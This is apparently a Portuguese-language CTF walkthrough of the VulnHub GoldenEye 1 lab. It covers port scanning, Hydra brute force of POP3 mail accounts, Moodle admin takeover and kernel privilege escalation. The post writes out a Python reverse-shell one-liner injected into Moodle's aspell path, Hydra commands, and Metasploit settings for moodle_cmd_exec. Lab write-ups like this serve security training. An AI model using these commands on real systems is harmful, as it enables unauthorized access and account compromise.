---
title: "VulnHub - GoldenEye 1"
tags: [Linux, Medium, CC, Moodle, Kernel, Searchsploit, BurpSuite, Wfuzz, Gobuster, SMTP, Hydra, Msfconsole, Metasploit Framework, BurpSuite Proxy]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/inicial.png)

Link: [GoldenEye1](https://www.vulnhub.com/entry/goldeneye-1,240/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nmap2.png)


### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas aberta no servidor

> Porta 80 -> Web

> Portas 25, 55006 e 55007 -> E-mail (?!)

## Enumeração da Porta 80

Entramos pra ver do que se trata o site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/web.png)

Código fonte...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/web1.png)

Código em javascript

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/web2.png)

Apareceu dois usários, Boris e Natalya... e a senha do Boris pelo visto é

```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

"Decodificamos" em html... e a senha é: **InvincibleHack3r**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/dec.png)

Gobuster nele

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/gobuster.png)

### /sev-home/

Bom, então acessamos ai

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sev.png)

A senha já temos... não?

**Boris:InvincibleHack3r**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sev1.png)

Entramos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sev2.png)

Bom já que não temos muita coisa, vamos fazer um wfuzz nele

Pegamos o cookie (por que tem user e senha) através do BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sev3.png)

E executamos nosso wfuzz

```bash
wfuzz -c -b "Authorization: Basic Ym9yaXM6SW52aW5jaWJsZUhhY2szcg==" --hs 401 -t 200 -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u 'http://192.168.56.101/sev-home/FUZZ'
```

Não coloquei a foto pq não conseguimos nada... fica apenas pra conhecimento o comando...

Nada... vamos prosseguir

## Enumeração POP - Porta 55007

A mensagem diz

```
GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system

Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
```

Bom, sabendo disso, vamos ver as portas altas que temos aberta

**Portas 25, 55006 e 55007 -> E-mail**

### Boris Brute Force

Bom, testamos acesso com as credenciais que temos, nada deu sucesso, então tentei um brute force com o usuário boris

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hydra.png)

Encontramos a senha dele... **boris:secret1!**

Entramos no e-mail dele e começamos a ver os e-mails com o comando **RETR x**, mas nada de útil...

```bash
nc 192.168.56.101 55007
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/boris.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/boris1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/boris2.png)

### Natalya Brute Force

Então fazemos o mesmo brute force com o usuário Natalya

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nat.png)

Encontramos a senha dela! **natalya:bird**

```bash
nc 192.168.56.101 55007
```

Acessamos e começamos a ver os emails também, com o comando **RETR x**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nat1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nat2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/nat3.png)

Opa! Credenciais novas!

```
username: xenia
password: RCP90rulez!
```

Outra mensagem importante que apareceu foi:

```
Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Ou seja, devemos alterar nosso /etc/hosts e adicionar o endereço do servidor

## Re-Enumeração Porta 80 - severnaya-station.com

Bom, alteramos o /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts.png)

Acessamos novamente o site

**severnaya-station.com**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts1.png)

Acessamos o diretório **http://severnaya-station.com/gnocertdir/**, como estava especificado no e-mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts2.png)

Logamos com as credenciais obtidas

```
username: xenia
password: RCP90rulez!
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts4.png)

Verificando as mensagens encontramos uma do Dr Doak?!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts5.png)

Bom, vamos procurar pela versão do moodle, pra conseguir explorar ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/hosts7.png)

Bom, não conseguimos encontrar em lugar nenhum a versão do moodle pq não temos o acesso de admin, então vamos prosseguir...

## Re-Enumeração POP - Porta 55007

Agora com o usuário **doak** vamos tentar outro brute force...

### Doak Brute Force

Então fazemos o mesmo brute force com o usuário doak

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/doak.png)

Encontramos a senha dele: **doak:goat**

Acessamos o e-mail dele e vemos as mensagens que ele possui

```bash
nc 192.168.56.101 55007
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/doak1.png)

Outras credenciais...

```
username: dr_doak
password: 4England!
```

Agora voltamos para a página web, já que temos novas credenciais e ele fala pra mexermos até encontrar alguma coisa interessante...

## Re-Re-Enumeração Porta 80 - severnaya-station.com - Doak user

Bom, então logamos com o novo usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/doak2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/doak3.png)

Navegando encontramos um arquivo interessante... **s3cret.txt**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/priv.png)

Lendo ele... temos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sec.png)

Show, acessamos o **http://severnaya-station.com/dir007key/for-007.jpg**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sec1.png)

Baixamos a imagem pra analisar e vemos que tem algo na descrição dela... é uma senha em base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/sec2.png)

Possivelmente as credencias do admin...

**admin:xWinter1995x!**

## Re-Re-Enumeração Porta 80 - severnaya-station.com - Admin user

Logamos como admin então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm1.png)

Agora começamos a vasculhar todo o site atrás de algo importante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm2.png)

Encontramos a versão dele... agora fica mais fácil de explorar!

**Versão 2.2** 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm3.png)

Pesquisamos por exploits pra ele então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm4.png)

[ExploitDB](https://www.exploit-db.com/exploits/29324)

Encontramos esse módulo do Metasploit Framework que explora essa versão do moodle

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm5.png)

# Explorando Moodle 2.2 - PSpellShell

Não gosto de fazer as coisas automáticas com o metasploit framework... vamos explorar do modo manual

Depois de pesquisar bastante sobre como explorar esse moodle, encontramos uma dica na referência abaixo, onde podemos explorar o **Spell Checker** dele, pra ao invés de ser no Google, como padrão, vir me dar um shell na minha máquina... Vamos lá

[Referência](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec)

Tudo que precisamos fazer é editar o parâmetro **system paths**, que pode ser econtrado em **Site Aministration** --> **Server** --> **System Paths** e no campo **Path to aspell**, nós inserimos nosso reverse shell...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex.png)

Adicionamos nosso reverse shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",55135));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex1.png)

Agora em **Site Administration** --> **Plugins** --> **Text Editors** --> **TinyMCE HTML Editor** mudamos o **Spell Engine** de **Google** para **PSpellShell**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex2.png)

Agora fazemos um **post no blog** e clicamos em **Toggle SpellChecker** enquanto nosso nc está escutando na porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex3.png)

Recebemos a conexão reversa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex4.png)

Pronto, agora temos um shell de **www-data**

# www-data --> Root

Vamos iniciar a escalação de privilégio agora

[Shell Interativo](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Navegando pela página web dele, encontramos um arquivo que não tinhamos visto antes... o splashAdmin.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex5.png)

Acessando via web, temos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex6.png)

Nesta mesma página achamos uma mensagem dizendo que o GCC foi excluído... por que?! Interessante...

```
Greetings ya'll! GoldenEye Admin here.

For programming I highly prefer the Alternative to GCC, which FreeBSD uses. It's more verbose when compiling, throwing warnings and such - this can easily be turned off with a proper flag. I've replaced GCC with this throughout the GolenEye systems.

Boris, no arguing about this, GCC has been removed and that's final!

Also why have you been chatting with Xenia in private Boris? She's a new contractor that you've never met before? Are you sure you've never worked together...?

-Admin
```

Encontramos outra pasta também que não tinhamos visto antes...

**http://192.168.56.121/006-final/xvf7-flag/**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex8.png)

Bom... não entendi nada... vamos prosseguir

## Kernel Exploitation

Bom... o gcc geralmente é usado pra compilar exploits pra kernel em CTFs e outras máquinas... se ele falou que o GCC foi substituido por outro equivalmente, muito possivelmente essa máquina está vulnerável a esse tipo de ataque...

Com o comando **uname -a** verificamos a versão do kernel que está instalada nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker.png)

Uma rápida pesquisada no **searchsploit** e vemos que temos um exploit para essa versão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker1.png)

Copiamos para nossa pasta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker2.png)

Não adianta compilarmos na nossa máquina e jogar pra lá... não vai dar certo... pesquisando na internet eu encontrei uma alternativa para o GCC, é o CC, aqui está o [Stack Overflow](https://stackoverflow.com/questions/1699495/is-there-any-alternative-to-gcc-to-do-pratical-development-under-nix) que fala sobre ele...

Verificando, temos ele na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker3.png)

Passamos o exploit para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker4.png)

Trocamos onde está "gcc" por "cc"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker5.png)

Compilamos ele

```bash
cc 37292.c -o exp 2>/dev/null
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker6.png)

Executamos e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker7.png)

Pegamos a flag!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/flag.png)

Agora faz sentido aquele diretório que temos lá que tinha a final flag na web...

# Algo a Mais

Eu havia estranhado por que não tinha funcionado pelo msfconsole a exploração da máquina, ai deu uma pesquisada e descobri o por que... vamos lá...

Pesquisamos por módulos que exploram o **moodle**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf.png)

Comandos utilizados

```
use exploit/multi/http/moodle_cmd_exec
set rhosts severnaya-station.com
set targeturi /gnocertdir/
set username admin
set password xWinter1995x!
set payload cmd/unix/reverse
set lhost 192.168.56.102
set lport 55135
```

Tentamos explorar e vemos que deu errado...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf2.png)

Jogamos a requisião para o BurpSuite então, pra ver exatamente o que está sendo enviado pro servidor

```
set proxies 127.0.0.1:8080
```

Enviamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf3.png)

Aqui está...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf4.png)

Analisando, devemos mudar algumas coisa pra ele funcionar...

De cada verificamos que devemos mudar o HOST e a senha...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf5.png)

Bom... isso é o básico pra ele poder enviar a requisição para o servidor corretamente...

Trocamos também para todas as requisições irem pro servidor corretamente, em uma aba do BurpSuite podemos alterar isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf7.png)

Contudo o exploit ainda não deu certo, ele vai para o servidor mas pelo que parece não me retorna um shell, creio que seja pelo fato de estar atrás de um proxy, quando tiver mais tempo debugo melhor isso, mas pelo menos serviu para verificarmos como funciona o BurpSuite como proxy para o metasploit e como realizar alterações nas requisições para um melhor funcionamento dos exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf8.png)